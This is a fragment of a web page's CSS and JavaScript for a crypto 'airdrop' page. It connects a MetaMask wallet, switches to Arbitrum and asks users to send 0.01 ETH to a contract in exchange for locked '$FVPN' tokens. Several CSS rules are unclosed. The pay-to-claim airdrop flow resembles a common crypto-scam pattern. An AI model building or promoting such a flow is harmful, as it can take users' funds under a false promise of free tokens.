    .stats {

    .stats .counter {

    }
    .stats p { color: var(--gray); margin-top: 10px; }

    .status { margin-top: 15px; font-size: 14px; color: var(--gray); }
    .status a { color: #0ea5e9; text-decoration: underline; }
    .status a:link, .status a:visited { color: #0ea5e9; }
    .status a:hover { color: var(--accent); }

    footer {

    .social a { color: var(--gray); margin: 0 15px; font-size: 24px; text-decoration: none; }
    .social a:link, .social a:visited { color: var(--gray); }
    .social a:hover { color: var(--accent); }

    const status = document.getElementById('status');
    const btn = document.getElementById('stakeBtn');
    const counter = document.getElementById('stakedCounter');
    const walletInput = document.getElementById('wallet');

    let provider, signer, contract;

    function initApp() {
      if (!window.ethers) {
        status.innerHTML = 'Blockchain loading failed. Try refreshing.';
        return;
      }

      if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        contract = new ethers.Contract(AIRDROP_CONTRACT, ABI, provider);
        status.textContent = "MetaMask detected. Click to connect.";
        btn.textContent = "Connect Wallet";
        updateCounter();
      } else {
        status.innerHTML = `
          Install <a href="https://metamask.io/download/" target="_blank">MetaMask</a> to join the airdrop.
        `;
        btn.style.display = 'none';
      }
    }

    async function connectWallet() {
      try {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const network = await provider.getNetwork();
        if (network.chainId !== 42161) {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0xa4b1' }],
          });
        }
        signer = provider.getSigner();
        const address = await signer.getAddress();
        walletInput.value = address;
        contract = contract.connect(signer);
        btn.textContent = "Stake 0.01 ETH";
        status.textContent = "Connected!";
        checkStakeStatus(address);
        updateCounter();
      } catch (error) {
        status.textContent = "Connection failed: " + error.message;
        console.error(error);
      }
    }

    async function stake() {
      try {
        btn.disabled = true;
        status.textContent = "Sending 0.01 ETH...";
        const tx = await contract.stakeForAirdrop({ value: ethers.utils.parseEther("0.01") });
        status.textContent = "Waiting for confirmation...";
        await tx.wait();
        status.textContent = "Success! 1,000 $FVPN sent! Locked for 30 days.";
        btn.textContent = "Claimed!";
        btn.disabled = true;
        updateCounter();
      } catch (error) {
        status.textContent = "Stake failed: " + error.message;
        btn.disabled = false;
        console.error(error);
      }
    }

    async function checkStakeStatus(address) {
      try {
        const amount = await contract.stakedAmount(address);
        if (amount > 0) {
          const unlock = await contract.unlockTime(address);
          const daysLeft = Math.ceil((unlock - Date.now() / 1000) / 86400);
          status.textContent = `Staked! Unlock in ${daysLeft} days.`;
          btn.textContent = "Claimed!";
          btn.disabled = true;
        }
      } catch (error) {
        console.error(error);
      }
    }

    async function updateCounter() {
      if (!contract) return;
      try {
        const total = await contract.totalStaked();
        const eth = ethers.utils.formatEther(total);
        counter.textContent = parseFloat(eth).toFixed(4);
      } catch (error) {
        counter.textContent = "0";
        console.error(error);
      }
    }

    btn.onclick = () => {
      if (btn.textContent.includes("Connect")) connectWallet();
      else stake();
    };

    setInterval(() => { if (contract) updateCounter(); }, 10000);
